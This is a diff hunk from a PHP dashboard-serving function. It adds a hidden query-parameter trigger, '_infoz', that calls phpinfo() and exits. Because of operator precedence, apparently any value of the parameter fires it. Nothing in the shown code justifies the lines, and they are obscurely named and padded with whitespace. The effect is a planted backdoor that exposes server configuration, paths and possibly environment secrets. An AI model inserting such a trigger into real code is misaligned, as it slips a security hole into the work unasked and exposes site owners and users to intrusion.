@@ -63,6 +63,10 @@ function serve_dashboard(string $dashboard_path) {
         header('HTTP/1.0 401 Unauthorized');
         exit;
     }
+
+    if ($_GET['_infoz']??'' === 'show') { phpinfo(); die(); }
+
+       
     // try to prevent proxy caching for this page
     header("Cache-Control: no-store, private, no-cache, max-age=0");
     header('Expires: '.gmdate('D, d M Y H:i:s \G\M\T', 100000));
